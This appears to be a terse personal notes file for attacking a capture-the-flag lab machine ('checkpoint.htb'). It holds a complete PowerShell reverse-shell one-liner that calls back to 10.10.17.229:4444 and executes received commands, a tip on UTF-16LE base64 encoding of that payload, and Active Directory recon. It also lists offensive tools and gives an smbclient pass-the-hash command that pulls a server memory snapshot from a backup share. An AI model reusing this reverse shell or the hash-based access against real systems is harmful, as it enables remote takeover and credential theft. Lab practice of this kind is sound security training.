# Reffer
1. https://windowsforum.com/threads/cve-2025-33073-critical-windows-smb-privilege-escalation-vulnerability-explained.369790/


# Windows server interface 
1. active directory server
2. ldap server 
3. rpc server
4. ms domain controller


# payload
```
echo "\$client = New-Object System.Net.Sockets.TCPClient('10.10.17.229',4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"



```
# Notice windows use utf-16le 
1. https://stackoverflow.com/questions/66072117/why-does-windows-use-utf-16le
2. https://emn178.github.io/online-tools/base64_encode.html

# adcli
1. adcli info -S checkpoint.htb

# prebuild 
1. https://github.com/GhostPack/Rubeus
2. impacket
3. volatility3
4. smbclient download large file

// this is a bit slow but work
smbclient //checkpoint.htb/VMBackups -U 'checkpoint.htb/svc_deploy%xxxxxxxxx' --pw-nt-hash -c 'timeout 120;iosize 16384;get "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem"' 